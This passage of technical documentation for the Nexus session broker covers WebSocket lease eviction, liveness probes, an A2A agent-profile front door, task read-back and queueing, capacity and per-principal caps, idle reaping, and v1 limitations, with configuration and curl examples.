at once with close code **`4501`**, and everything from that moment — replayed
frames and live ones alike — goes to the new connection.

**A client must never keep two connections open to one lease.** They will evict
each other in a loop, and neither will see a whole stream. If you are unsure
whether your previous socket is really gone, just reconnect: displacing it is the
supported outcome, and it is what the reconnect recipe above relies on.

The newest connection wins rather than the oldest **on purpose**. A half-open
socket — a slept laptop, a moved network, a dropped NAT flow — still looks
attached from the broker's side until something writes to it, and the client
always notices its own dead connection long before the broker's
[liveness probe](#detecting-a-dead-socket) does. Refusing the second connection,
which is what the broker used to do, therefore made the lease unreachable in
exactly the situation the fresh-ticket reconnect exists for: the genuine owner,
correctly authenticated, turned away on behalf of a socket with no peer.

Two things bound that power:

- **Only the lease's owner can displace it.** Ownership is checked *before* the
  upgrade, so a caller who does not own the lease gets the same
  `404 {"error":"unknown lease"}` an unknown lease gets and evicts nothing.
  Eviction is never reachable across tenants.
- **It composes with `?from_seq=`.** The displacing connection is a normal
  attach: it is replayed the tail it names, gap notice and all, before the live
  stream resumes. Eviction does not bypass the replay cursor.

Every eviction is recorded in the broker log with the lease id, the principal
that caused it and the close reason, so a client stuck in a reconnect war is
visible from the operator's side rather than only from the user's.

#### Client close codes

The broker uses the RFC 6455 application range (4000-4999) for the two teardowns
where the difference changes what a client should do next. Everything else — a
manual release, an idle reap, a shutdown — closes with an ordinary going-away.

| Close code | Reason text | What happened | What the client should do |
|---|---|---|---|
| `1001` | `lease closed` | The lease was released, idle-reaped, or the broker is shutting down. | The session is over. Claim a new lease if the user wants another. |
| `4500` | `instance crashed` | The instance process exited unexpectedly. | The session is gone — do **not** reconnect to this lease. Claim a new one. |
| `4501` | `superseded by a newer client connection` | Another socket attached to this lease and took over. | The lease is alive and streaming somewhere else. Do **not** reconnect in a loop; usually this connection is the one that has been replaced by your own newer tab or retry. |

### Detecting a dead socket

A TCP connection can die without either end being told. A laptop that sleeps, a
phone that moves from Wi-Fi to cellular, a NAT table that ages out an idle flow —
in every case the socket stays *open* on the far end's books, writes are still
accepted into a send queue, and nothing surfaces until the OS keepalive
eventually notices, which on a default configuration is on the order of **hours**.
Until then the broker believes a lease has a peer that is never going to read
another byte.

So **both frame pumps probe their peer**, in both directions:

- The broker pings each attached **client** and each attached **instance** every
  **15 seconds**.
- The instance's dial-back client pings the **broker** on the same cadence.
- A peer that answers nothing for **45 seconds** — three consecutive probes — has
  its socket torn down. On the broker side that detaches the connection from the
  lease (the lease itself survives, so a client can reconnect and
  [resume](#resuming-from-the-buffer)); on the instance side it drops the
  dial-back socket and redials with the usual backoff, with buffered output
  intact.

The deadline is three times the interval **on purpose**. One unanswered ping
proves very little — a stop-the-world GC pause, a saturated uplink, a starved
process — and a deadline set at or just above the interval would turn each of
those into a dropped connection. Requiring sustained silence across three
independent probes is what makes the signal worth acting on.

Two things follow that are easy to get wrong:

- **This is not idle reaping, and it never reaps an idle session.** The probe is
  a WebSocket ping, answered by the peer's *WebSocket stack* whether or not there
  is a human at the far end. A session sitting untouched overnight with no user
  input answers every one of them and survives indefinitely. Releasing genuinely
  idle leases is a separate policy, owned by
  [`idle_timeout`](#idle-reaping) — which is driven by real client → instance
  input and by the instance's own turn boundaries, never by a ping. A ping
  detects a **dead socket**; turn liveness detects a **live turn**; reading
  either as the other reaps healthy sessions.
- **It is not part of the frame protocol.** Ping and pong are RFC 6455 control
  frames, not `brokerframe` signals, so there is no new signal, no version bump,
  and nothing a client has to implement: any conformant WebSocket client already
  answers. There is no configuration key either — the interval and deadline are
  constants.

The unresponsive-peer teardown skips the WebSocket close handshake. A graceful
close writes a close frame and then waits up to five seconds for the peer to echo
it, which against a peer that has already stopped answering is five seconds of
the lease still believing it has a socket — exactly the bounded detection the
probe exists to provide. A peer torn down this way sees an abnormal closure,
which is the honest description of what happened to it.

## The A2A front door (`agents:`)

Everything above assumes a **Nexus-aware client**: `POST /claim` requires the
full nexus config as inline YAML, so the caller must know Nexus exists and which
plugins to activate. A third-party [A2A](https://a2a-protocol.org) client knows
none of that.

The `agents:` block is the answer. Each **profile** binds a nexus config, a
[binary registry](#serving-several-nexus-variants-the-binary-registry) entry and
an Agent Card under one name, and publishes that name's A2A endpoints. The
client names an agent by URL; the operator decided long ago what running it
means.

```yaml
# broker.yaml
advertise_addr: "https://broker.example"    # the origin the agent cards advertise
state_dir: "~/.nexus/broker"                # needed for continuity across a restart

agents:
  support:
    binary: nexus                           # optional; omitted means the reserved `nexus` entry
    config: "~/agents/support.yaml"         # the nexus config instances of this profile boot with
    card:
      name: "Support Agent"
      description: "Answers customer questions from the product knowledge base."
      version: "1.2.0"
      skills:
        - id: "answer"
          name: "Answer questions"
          description: "Answers a customer question and cites its sources."

a2a:                                        # optional; every value below is the default
  tasks:
    ttl: "24h"                              # how long a finished task stays readable
    max_per_context: 50                     # tasks kept per (caller, conversation)
    input_timeout: "15m"                    # how long a question may wait on a human
```

The `a2a:` block is **not** per profile, deliberately: the task store is one
file with one retention policy for the whole broker, so hanging its knobs off
each profile would invite four different retentions for one file. Its keys and
their meanings are `nexus.io.a2a`'s, so an operator who has configured the
standalone listener already knows them — see
[Reading tasks back](#reading-tasks-back-gettask-listtasks-subscribetotask) and
[Two messages on one conversation queue](#two-messages-on-one-conversation-queue)
for what each one actually governs.

That publishes three routes, namespaced under the profile name so profiles
cannot collide:

| Route | Purpose |
|-------|---------|
| `GET /agents/support/.well-known/agent-card.json` | The profile's Agent Card |
| `POST /agents/support/a2a` | JSON-RPC 2.0 binding |
| `/agents/support/a2a/v1/...` | HTTP+JSON (REST) binding |

```bash
curl -s https://broker.example/agents/support/.well-known/agent-card.json \
  -H 'Authorization: Bearer <token>' | jq
```

**Profiles are the unit of public identity: one card, one persona, one config.**
Two agents that should look different to the outside world are two profiles, not
one profile with a switch.

**Publishing a new agent does not need a restart.** Add the profile and send a
`SIGHUP`: every card is re-rendered and the whole set is swapped in one step, so
no request can see one profile's identity under another's name. The one thing a
reload cannot do is switch the ingress **on** — a broker that booted with no
`agents:` block registered no A2A routes at all, so its first profile is a
restart. See
[Changing config without a restart](#changing-config-without-a-restart-sighup).

A few rules worth knowing before you write the block; the full key list is in the
[configuration reference](../configuration/reference.md#agent-profiles-agents).

- **A profile name is a URL path segment.** Letters, digits, `-`, `_` and `.`
  only. Names are compared with whitespace trimmed, so `"support ":` and
  `support:` collide and fail the boot.
- **An unknown `binary` fails startup**, naming the alternatives — it does not
  fall back to the reserved `nexus` entry, for the same reason `POST /claim`
  answers `400` rather than quietly spawning the base binary for a caller that
  asked for a vision build.
- **A missing `config` file fails startup** too, resolved and stat()ed at boot
  like every registry path, so a typo is caught at deploy time rather than by the
  first A2A request.
- **You author identity; the broker derives the rest.** `supportedInterfaces`,
  `capabilities` and `securitySchemes` have no config keys: they describe what
  the broker actually serves, and an operator must not be able to state one that
  is false. In particular the card's security schemes come from the broker's own
  [`auth:`](#authentication) chain, so a published card cannot advertise a
  credential the broker does not accept.
- **Set `advertise_addr`.** A card must carry absolute URLs. With profiles
  configured and a wildcard bind (`:8080`) and no `advertise_addr`, the broker
  refuses to start rather than publish a URL no client can dial.
- **Every A2A route is behind the same `auth:` guard as `/claim`, the card
  included.** A refusal is the broker's usual `{"error": "..."}` envelope. This
  differs from the standalone [`nexus.io.a2a`](../plugins/io/a2a.md) plugin,
  which serves its card unauthenticated: that one binds loopback, the broker is
  an ingress. Hand clients a credential out-of-band, which the specification's
  "Direct Configuration" discovery path explicitly sanctions.

**A broker with no `agents:` block is unchanged in every respect** — no routes
are registered, no card is built, and nothing new appears in the boot log.

> **Current state.** `SendMessage`, `SendStreamingMessage`, `CancelTask`,
> `GetTask`, `ListTasks` and `SubscribeToTask` are all driven end to end: a
> message starts (or resumes) a real isolated instance, the turn is translated
> back into A2A frames, and the task stays readable afterwards — see
> [One conversation, one instance](#one-conversation-one-instance-contextid),
> [What the A2A ingress translates](#what-the-a2a-ingress-translates) and
> [Reading tasks back](#reading-tasks-back-gettask-listtasks-subscribetotask)
> below. The push-notification operations and `GetExtendedAgentCard` still answer
> a well-formed `UnsupportedOperationError` carrying
> `detail: OPERATION_NOT_IMPLEMENTED`, and the matching card capabilities are
> `false`.

### One conversation, one instance (`contextId`)

An A2A client holds a **`contextId`**. The broker holds leases. **The client
never learns the second thing exists.**

```
contextId ──(durable index)──▶ engine session id ──(the /claim spawn spine)──▶ lease
```

The middle term is what makes the trick work. A lease is mortal — it is released
when a conversation goes quiet, it dies when its instance crashes — but an engine
session is a directory on disk that outlives every process that opened it. So a
message on a context whose instance has gone is not an error to report; it is a
session to resume.

| What the broker knows about the `contextId` | What the message does |
|---|---|
| Nothing — a new conversation, or a message with no `contextId` at all (one is minted) | Spawns an instance with **no** `-recall`. |
| A live instance | Goes straight to it. History is what the running engine holds; nothing is replayed. |
| A live lease already running that context's session, which this process lost track of (a broker **restart** with a surviving instance) | **Adopts** it, rather than putting a second engine on one session directory. |
| A session with no live instance — idle-released, crashed, or a restart | Spawns a new instance with **`-recall <session id>`** so the engine replays the history. |

**Nothing about any of that reaches the client.** It sends a message and gets an
answer. There is no claim, no lease id, no reconnect, and no "your session
expired".

```bash
# First message: this cold-spawns an isolated nexus instance.
curl -s https://broker.example/agents/support/a2a \
  -H 'Authorization: Bearer <token>' -H 'Content-Type: application/json' -d '{
    "jsonrpc":"2.0","id":1,"method":"SendMessage",
    "params":{"message":{"messageId":"m1","role":"ROLE_USER",
      "contextId":"conv-42","parts":[{"text":"How do I rotate my API key?"}]}}}'

# An hour later, after idle_timeout released the instance: same call, same
# contextId. The broker re-spawns with -recall and the conversation continues.
```

**Continuity is keyed by `(principal, profile, contextId)`.** A2A lets a client
choose its own `contextId`, so keying on it alone would let anyone name someone
else's conversation and be handed that session's history. A colliding
`contextId` under a different principal — or a different profile — resolves to
the caller's **own** binding instead. With no `auth:` block every caller is the
same anonymous principal, exactly as lease ownership already behaves.

**Durability needs [`state_dir`](#surviving-a-restart-set-state_dir).** The
binding is written to `<state_dir>/a2a-contexts.jsonl`, a separate append-only
index beside the lease journal for the same reason the
[session → binary index](#serving-several-nexus-variants-the-binary-registry) is
separate: the journal is compacted down to live leases, and a resume always
happens after the lease was released. Without `state_dir` a conversation is
resumable only for as long as the broker process lives.

**And the index is capped at 4096 bindings, oldest dropped first — which is
lossy, deliberately, and silent.** Nothing ever retires a binding, because being
resumable later is the entire point of one, so the key space has no natural
bound and a cap is the only thing keeping the file finite. A conversation whose
binding is evicted reads back as *unknown*, and unknown means *new*: the next
message on that `contextId` starts a **fresh session** and the client is told
nothing — the agent has simply forgotten. The degradation is always to
forgetting, never to answering with the wrong session, and 4096 is generous for
exactly that reason. If a conversation must survive indefinitely, keep the
engine session id rather than relying on this file. See
[A2A context → session index](../configuration/reference.md#a2a-context--session-index-a2a-contextsjsonl).

**An A2A-created lease is an ordinary lease.** It is listed by `GET /leases`,
owned by the A2A caller, counted against `max_concurrent`, torn down by
`POST /release`, watched for crashes, and **reaped by `idle_timeout`**. Every
message the ingress sends resets the idle timer, exactly as a WebSocket client's
input does — so an active conversation is never reaped mid-turn, and a finished
one is released like anything else. The instance is deliberately **not** released
at the end of each turn: that would make every message a cold boot.

**A spawn that fails settles the task; it never hangs.**

| Condition | Task state |
|---|---|
| Unknown `binary`, a session created by a different binary, an unreadable or empty profile `config`, or the caller over one of its [per-principal caps](#per-principal-caps-needs-auth) | `TASK_STATE_REJECTED` — the broker refused; the same message will fail the same way until an operator changes something (or, for a quota, until the caller releases a lease) |
| The instance died booting, never signalled ready, the broker is at capacity, or a surviving instance is still mid-reattach | `TASK_STATE_FAILED` — attempted and did not come up; a retry may succeed |

The terminal status message explains what happened **without naming a lease**.

**What this costs in latency.** The broker's two internal handshake bounds are
the same ones a `POST /claim` caller already waits on, and they apply to the
*first* message of a conversation and to a message that re-spawns one:

| Bound | Value | What an A2A caller sees |
|---|---|---|
| Ready wait | 30s | A cold spawn blocks the request until the instance is ready. Worst case: 30s, then a `FAILED` task. |
| Session-report grace | 5s | Waited after ready, for the instance's session id. Not on the answer path — a report that never arrives only costs the conversation its durable binding, so a later resume starts fresh instead of replaying. |

Both are constants rather than config keys: they bound the broker's handshake
with a process it started, not a policy to tune. **A second message on a live
conversation pays neither** — it goes straight to the running instance, which is
the entire reason the instance is kept alive between turns.

### What the A2A ingress translates

The broker sits between two protocols it did not design. On one side an A2A
client speaks tasks, states and artifacts; on the other a leased `nexus`
instance speaks the flat IO envelope its
[`nexus.io.broker`](../plugins/io/broker.md) plugin puts inside every `SignalIO`
frame. Until now the broker forwarded that envelope without looking at it. It
now reads it, and this is the whole of the mapping.

**Inbound — A2A to the instance:**

| A2A | IO payload sent to the instance |
|---|---|
| A message with no `taskId` | `{"type":"input","content":"…"}` — which the instance turns into `io.input` |
| A message naming a parked `taskId` | `{"type":"hitl.response","request_id":"…","choice_id"\|"free_text":"…"}` |
| `CancelTask` | `{"type":"cancel","turn_id":"…","source":"broker.a2a"}` |

The message's text parts are joined with a blank line. A non-text part is
**refused** with `ContentTypeNotSupportedError` rather than dropped: the `input`
payload is a single string, so there is nowhere for a file to go.

**Outbound — the instance to A2A.** `turn_id` is what anchors a task: the first
payload carrying one binds the task to that Nexus turn, and a payload naming a
different turn is ignored.

| IO payload | A2A |
|---|---|
| any first payload | `SUBMITTED` → `WORKING` status update |
| `stream.delta` | accumulates the answer text; mints no frame of its own |
| `stream.end` | closes the current response segment; **does not** end the task |
| `output` | replaces the accumulated text with what the output gates published |
| `status` (`thinking`, `tool_running`, …) | keeps the task `WORKING` |
| `status` (`idle`) | publishes the answer artifact, then `COMPLETED` |
| `hitl.request` | `INPUT_REQUIRED` carrying the question, options included |
| `cancel.complete` | `CANCELED` |
| the instance going away | `FAILED` naming the cause |

Three of those are worth stating outright, because they are the decisions a
second reader would otherwise get wrong:

- **`stream.end` does not complete the task; `status: idle` does.** A turn can
  produce several model responses (each tool round is one), and the instance
  runs its output gates *after* the last of them. Completing at a stream end
  would publish the model's draft rather than what Nexus decided to say.
- **The answer usually comes from the deltas, not from `output`.** Every shipped
  agent loop tags its `io.output` with `streamed=true`, and `nexus.io.broker`
  drops those — so on the ordinary streaming path the deltas are the only text
  the envelope carries. An `output` payload, when one does arrive, wins.
- **A payload the broker does not understand is ignored, never a task failure.**
  The envelope is shared with every other broker client, so an instance may
  legitimately send something this ingress has no A2A meaning for — a tool
  `approval.request` is the live example — and an instance newer than the broker
  in front of it must keep working.

Because the frames a client sees must not depend on which Nexus deployment
answered, this mapping and the standalone [`nexus.io.a2a`](../plugins/io/a2a.md)
plugin are both judged by the same conformance corpus (`pkg/a2a/a2aconform`).

**The broker satisfies 5 of the corpus's 9 vectors and skips 4, and the four are
skipped rather than faked.** The IO envelope carries **no tool results** —
`nexus.io.broker` subscribes to neither `tool.invoke` nor `tool.result`, and its
payload has no field for either — so there is nothing broker-side to publish a
tool, file or artifact-budget vector from. That is a property of the transport,
not a gap in this effort, and it is the one place a broker-fronted agent is
genuinely less expressive than a standalone one: **the same agent behind
`nexus.io.a2a` returns tool results and written files as artifacts; behind the
broker it returns only the turn's answer.** The corpus reports the skips by name
on every run, and a mapping that declared a feature it cannot produce would pass
a vector by lying about its transport. See
[Plugin contracts](plugin-contracts.md) for the wider pattern.

### Reading tasks back (`GetTask`, `ListTasks`, `SubscribeToTask`)

A2A tasks outlive the call that created them, and on a broker they outlive far
more than that: the instance that ran a task is released when the conversation
goes quiet, and the broker process itself restarts. A client asks about a task
*precisely* when those things have happened, so the broker keeps a **durable
record of every task** in `<state_dir>/a2a-tasks.jsonl` — the same
append-and-compact file shape as the lease journal, so a `state_dir` holds one
kind of thing rather than two.

```bash
# What did that task end up doing?
curl -s https://broker.example/agents/support/a2a/v1/tasks/task-abc123 \
  -H 'Authorization: Bearer <token>' | jq '.status.state, .artifacts[0]'

# What has this conversation been asked lately?
curl -s 'https://broker.example/agents/support/a2a/v1/tasks?contextId=ctx-42&pageSize=10' \
  -H 'Authorization: Bearer <token>' | jq '.tasks[].id'

# Reattach to a task that is still running.
curl -sN -X POST https://broker.example/agents/support/a2a/v1/tasks/task-abc123:subscribe \
  -H 'Authorization: Bearer <token>'
```

Four things about these three operations:

- **They answer from the record, not from memory** — even while the task is
  live. Every frame is persisted before it is delivered, so the record is never
  behind what a client has already been told, and there is one answer to the
  question rather than two that can differ.
- **They are scoped to the authenticated caller *and* to the profile they were
  addressed to, and a task outside that scope is *indistinguishable* from one
  that never existed.** Same error, same status, same body. A distinct "exists
  but is not yours" answer would be an existence oracle for ids the caller was
  never told — the same reasoning behind the broker's single `unknown lease`
  refusal. Profile is part of the key for the same reason it is part of a
  conversation's: `ListTasks` on the research agent lists research tasks, not
  the caller's support conversations.
- **`SubscribeToTask` reattaches to a live task** and receives exactly the frames
  every other attached stream receives, opening on the state it missed. A task
  that is already terminal gets its state and an immediate EOF rather than an
  open socket nothing will ever write to; a task still queued gets its
  `SUBMITTED` snapshot and a stream that stays open until its turn runs.
- **A task left in flight by a stopped broker is settled at `FAILED`** when the
  store reopens, with a status message saying so. A client polling `GetTask`
  gets an ending rather than `WORKING` for ever.

**With no `state_dir` the store is memory-only.** All three operations still
answer, but only for tasks this process ran. That is the same bargain such a
broker has already made for its leases.

Retention is a real policy and is configurable — `a2a.tasks.ttl` (default `24h`)
and `a2a.tasks.max_per_context` (default `50`), plus a fixed global ceiling and a
16 KiB cap on stored text. A turn's *streamed* output is never truncated; only
the stored copy is, and it says so when it happens. The numbers and the reasoning
behind each are in the
[configuration reference](../configuration/reference.md#a2a-task-retention-a2atasks).

### Two messages on one conversation queue

A Nexus instance runs **one agent loop**. Send it two inputs while a turn is in
flight and you do not get two turns — you get one turn with both messages mixed
into it. So the broker will not do that: **a conversation runs one task at a
time.**

A second message on a `contextId` whose task is still live is accepted and
queued. Its task sits in `TASK_STATE_SUBMITTED` — the specification's own word
for "accepted, not yet started" — with nothing sent to any instance, until the
task ahead of it is terminal. Then it moves to `TASK_STATE_WORKING` and runs. A
queued task is a complete task the whole time: readable with `GetTask`,
streamable with `SubscribeToTask`, cancellable with `CancelTask`.

The queue is per **(caller, profile, `contextId`)**, so two conversations never
wait on each other, and it advances on exactly one event: a task reaching a
terminal state. That is what makes it robust rather than fragile —

- the instance crashing or being idle-released fails the active task, which
  promotes the next one, which **acquires a fresh instance** and carries the
  conversation on from its session;
- cancelling a queued task removes it and disturbs nothing;
- a queued turn is detached from the request that submitted it, so a client that
  hangs up has not withdrawn its message.

**The one case that needs a deadline is a question nobody answers.** A task at
`TASK_STATE_INPUT_REQUIRED` keeps the queue on purpose: the agent loop is blocked
inside `ask_user`, so starting the next turn would send input to an instance that
cannot read it. `a2a.tasks.input_timeout` (default `15m`, `"0s"` disables) is
what stops that being a deadlock — on expiry the task is driven to `FAILED`,
every attached stream closes, the instance is told to cancel the turn, and the
queue moves. Fifteen minutes is chosen against a human: a question routed to a
person has to survive being paged, read, thought about and answered.

## Capacity and queueing

`max_concurrent` caps live instances. Each claim acquires a slot **before**
spawning, so the live count can never exceed the cap. When the cap is full a
claim does not fail immediately — it parks in a **FIFO wait queue** bounded by
`queue_wait_timeout`. The moment a slot frees (release, idle, or crash) it is
handed to the oldest waiter. Set `queue_wait_timeout` to `0` to disable waiting
(at-capacity claims are rejected immediately with `503 no capacity`); set
`max_concurrent` to `0` for unlimited instances.

### The queue itself is bounded

`max_concurrent` bounds live instances; **`max_queue_depth` (default `64`) bounds
the claims waiting behind them**. Every parked waiter costs a goroutine, a timer
and an open HTTP connection for up to `queue_wait_timeout`, so an unbounded queue
is an unbounded resource commitment. A claim that arrives when the queue is
already this deep is refused **immediately** — never parked, so it costs none of
the three — with `503 {"error":"capacity queue full"}`.

That is a **third distinct message**, and the distinction is the point: reading
`claim failed` log lines, an operator can tell the three apart without
correlating timings.

| Message | What actually happened |
|---------|------------------------|
| `no capacity` | The cap is full and waiting is switched off (`queue_wait_timeout <= 0`). |
| `capacity wait timed out` | This claim waited its full `queue_wait_timeout` and gave up. |
| `capacity queue full` | This claim was never allowed to wait — the queue was at `max_queue_depth`. |

Set `max_queue_depth` to `0` for an unlimited queue.

### Per-principal caps (needs `auth:`)

Two optional keys bound what **one authenticated principal** may hold:

- **`max_leases_per_principal`** — live leases. Over quota answers
  `429 {"error":"lease limit reached for this principal"}`.
- **`max_queued_per_principal`** — claims parked in the capacity queue. Over
  quota answers `429 {"error":"queued claim limit reached for this principal"}`.

`429`, not `503`: these are **quota** answers about the caller, not statements
about the broker, which may have slots to spare. Both are checked **before** a
capacity slot is taken and before the claim is queued, so an over-quota caller is
refused instantly rather than parked only to be refused later, and neither can
leak a slot. Both default to `0`, meaning off — a per-tenant quota is a policy
only the operator can size.

`max_queued_per_principal` is what stops one caller looping on `POST /claim` from
occupying the whole queue and timing every other tenant's single claim out behind
it. It does **not** reorder anything: the queue stays strictly FIFO across all
principals, and per-principal fair queueing is out of scope. It bounds how much
of the queue one caller may hold.

> **Both keys are inert unless `auth:` is configured, and never apply to the
> anonymous principal.** With no `auth:` block every lease is owned by the same
> anonymous identity, so a per-principal cap applied there would count the whole
> broker against one principal and silently become a second, lower
> `max_concurrent`. A broker with no `auth:` block therefore behaves exactly as it
> did before these keys existed, whatever they are set to. The same exemption
> covers a claim that reaches the broker with no principal on a broker that *does*
> configure auth.

Leases restored by [restart recovery](#restart-recovery) bypass the per-principal
caps for the same reason they bypass `max_concurrent`: the process is already
running, and refusing it would hide it rather than stop it. A principal over its
cap after a restart is simply admitted no new leases until it drains back under.

## Idle reaping

If a lease sits for `idle_timeout` with **no turn in flight** and no client
activity, the broker releases it through the same teardown path as
`POST /release` (so the session is persisted), recording the terminal reason
`idle`. Set `idle_timeout` to `0` to disable reaping.

Two things reset the idle timer: an inbound `io` input frame (client →
instance), and the moment the instance reports its **turn finished**. Output
produced mid-turn, pings and control frames do not.

### A turn in flight is never reaped

`idle_timeout` measures the **human pause**, not the turn. A lease whose
instance is working is exempt from it however long ago its client last typed, so
a ten-minute autonomous turn is no longer indistinguishable from an abandoned
session.

The broker learns this from the instance's own `io.status` frames, which it
already relays to the client and now also reads on the way past:

| `io.status` state | Meaning for the lease |
|---|---|
| `thinking`, `tool_running`, `streaming`, `waiting`, `cancelling` | a turn is **live** — exempt from `idle_timeout` |
| `idle` | the turn has **settled** — the idle clock restarts from here |
| anything else | **ignored** — liveness is left exactly as it was |

Unknown states (and any payload the broker cannot decode) are ignored rather
than treated as either signal, so an instance newer than the broker in front of
it keeps working and its frames still reach the client untouched.

Settling a turn restarts the idle clock rather than leaving it where the user's
input left it. Without that, a turn that ran longer than `idle_timeout` would be
reapable the instant it finished — the answer torn down before the user could
read it.

### `max_turn_duration` bounds the exemption

The exemption above is unbounded on its own: an instance that wedges mid-turn,
or whose tool never returns, never reports `idle` and would hold its lease — and
its `max_concurrent` slot — forever. `max_turn_duration` (default `30m`) is the
backstop. A turn that outlives it is torn down through the ordinary release
path, with the terminal reason **`turn timeout`** rather than `idle`, so an
operator reading the journal can tell "nobody was here" from "killed mid-work".

The clock starts at the first work state after a settled period and is not
refreshed by later status frames, so it measures the whole turn. Set it to `0`
to disable the bound. It is enforced by the same sweeper as `idle_timeout`, so
`idle_timeout: 0` switches both off.

Size `max_turn_duration` above the longest turn this deployment legitimately
runs: a lease reaped as `turn timeout` had work in progress. Note that a turn
parked on a human — a plan awaiting approval, an `ask_user` question — counts as
live, so it is bounded by this key rather than by `idle_timeout`.

Between them these are the **only** policies that release a lease for
inactivity. The liveness probe described under
[Detecting a dead socket](#detecting-a-dead-socket) does not: it detaches
sockets that have stopped answering at the transport level and never touches a
peer that is merely quiet, and conflating the two would reap healthy sessions.

**This applies to [A2A](#the-a2a-front-door-agents) instances too**, and it is
what makes them affordable: every message the A2A ingress sends counts as client
input, so an active conversation is never reaped, and a conversation nobody is
having stops costing a process. The next message on that `contextId` re-spawns
the instance with `-recall`, so the client sees continuity rather than a
released session.

## v1 caveats

The session broker is a **v1**. Understand these boundaries before deploying it:

- **Identity is verified, but authorization is thin.** With an
  [`auth:` block](#authentication) configured the broker validates a credential on
  every client-facing route, stamps the resulting principal on each lease as its
  **owner**, refuses release / connect / ticket-mint to anyone else, and scopes
  `GET /leases` to the caller unless it holds `auth.admin_scope`. What it does
  **not** do:
  - **It verifies identity; it never issues it.** There is no login, no user
    store, no token endpoint. Credentials come from a static table you write, or
    from your own identity provider, or from a proxy you already trust. The one
    credential the broker mints is a WebSocket [ticket](#connecting-the-ticket-flow),
    which is a lease-scoped capability, not an identity.
  - **Authorization is lease ownership plus one read-only admin scope.** No roles
    and no policy engine. The only per-tenant enforcement is the pair of
    admission caps described under
    [Per-principal caps](#per-principal-caps-needs-auth), which key off the
    principal **id**; `tenant` is carried on the principal and recorded, but
    nothing enforces it.
  - **No mTLS, and no TLS at all.** The broker speaks plain HTTP on
    `listen_addr`; terminate TLS at a proxy and set
    [`advertise_addr`](#behind-a-proxy-set-advertise_addr) to the `wss://` address
    clients use. Client certificates are not a supported credential.
  - **No per-tenant rate limiting.** `max_concurrent` is a global cap and not a
    per-binary one, so one variant can still fill it for everybody. There ARE
    optional per-principal caps on live leases and queued claims
    ([`max_leases_per_principal`, `max_queued_per_principal`](#per-principal-caps-needs-auth)),
    but they are off by default, they need `auth:` to have any effect, and they
    are admission caps rather than a rate limit — nothing bounds how *often* a
    caller may claim and release. Nor is the
    [binary registry](#serving-several-nexus-variants-the-binary-registry) part
    of the access-control surface: any caller allowed to claim may name any
    registered entry.
  - **No OS-level sandboxing of instances**, either — access control does not
    change what a spawned process can do to the host (see the last caveat below).
  - With **no** `auth:` block, none of the above is enforced at all: any client
    that can reach the broker can claim, connect to, and release any instance. The
    broker logs one `WARN` at boot saying so. The one thing that block never
    governed is the instance dial-back, which always requires its
    [per-spawn secret](#the-instance-dial-back-secret).
- **Single broker, single host.** Restart-reattach works; genuine clustering does
  not. There is **no shared lease registry**, no cross-broker `GET /leases`, and
  no routing of a request to the broker that owns the lease.
  With `state_dir` **unset**,
  a broker **restart orphans running instances** and loses all lease tracking —
  the orphaned `nexus` processes must be cleaned up manually. **With `state_dir`
  set, a restart no longer orphans them**: the broker replays its journal, drops
  the leases whose process is gone, restores the rest with their owners and
  capacity slots, and the surviving instances reattach on their own reconnect
  backoff — reaped after `reattach_window` if they do not (see
  [Surviving a restart](#surviving-a-restart-set-state_dir)). Recovery is
  strictly single-broker: it only ever reclaims leases stamped with **this**
  broker's `broker_id`. Running several brokers behind one load balancer does
  **not** work as a cluster: a lease lives on exactly one process, so each broker
  must be individually addressable via `advertise_addr`, clients must reconnect to
  the URL the claim returned rather than to the LB, and each broker needs its
  **own** `state_dir` — they never read each other's.
- **The session → binary check is advisory.** A resume is reconciled against the
  variant recorded for that session, but the recording is best-effort: a broker
  with no `state_dir` keeps nothing, the index is capped at 4096 bindings, and
  sessions created before the feature (or by another broker) have none. An
  unrecorded session resumes unchecked, so
  [do not treat the `409` as a guarantee](#a-resume-re-uses-the-binary-that-created-the-session).
- **A2A conversation continuity is bounded, and the bound is lossy by design.**
  The `contextId` → session index holds at most **4096** bindings and drops the
  oldest first; a broker with no `state_dir` keeps none across a restart. An
  evicted binding reads back as *unknown*, so the next message on that
  conversation starts a **fresh session** with no history and **nothing tells the
  client** — see
  [One conversation, one instance](#one-conversation-one-instance-contextid). The
  failure is always forgetting, never answering from the wrong session.
- **A2A task history is bounded, and the bound is lossy by design.** The task
  store keeps 24 hours of finished tasks, 50 per conversation, 2048 in total, and
  16 KiB of text per artifact or message — see
  [Reading tasks back](#reading-tasks-back-gettask-listtasks-subscribetotask). A
  task evicted by any of those reads back as **unknown**, which is
  indistinguishable from an id that never existed, and a long answer reads back
  truncated (marked as such). Nothing warns a client that this happened. If you
  need a durable transcript, take one from the engine session rather than from
  the broker's task record, which is a read-back convenience and not an archive.
- **A broker-fronted agent publishes fewer artifacts than a standalone one.** The
  instance IO envelope carries no tool results, so a turn's tool output and the
  files it wrote do **not** become A2A artifacts here — only the turn's answer
  does. The same agent served directly by
  [`nexus.io.a2a`](../plugins/io/a2a.md) returns all three. This is measured
  rather than asserted: the shared conformance corpus records the broker mapping
  at **5 of 9 vectors, 4 skipped**, and names the skips on every run.
- **Cold-spawn per claim.** There is no pre-warm pool, so each claim pays full
  engine boot latency before the instance signals ready.
- **No OS-level per-tenant sandboxing.** Instances are separate processes but
  are not otherwise sandboxed from each other or the host beyond what the OS
  user provides.

## See also

- [`nexus.io.broker` plugin](../plugins/io/broker.md) — the dial-back transport
  inside each instance.
- [Configuration Reference](../configuration/reference.md#session-broker-nexus-broker)
  — authoritative broker + plugin config keys.
- [Authentication (`auth:`)](../configuration/reference.md#authentication-auth) —
  every validator key, default and validation rule, plus the per-route status
  mapping and the audit-record shape.
- [A2A](a2a.md) — the protocol the `agents:` block speaks, and the standalone
  serving plugin the broker's cards are modelled on.
- [Sessions](../architecture/sessions.md) — on-disk session layout and `-recall`.
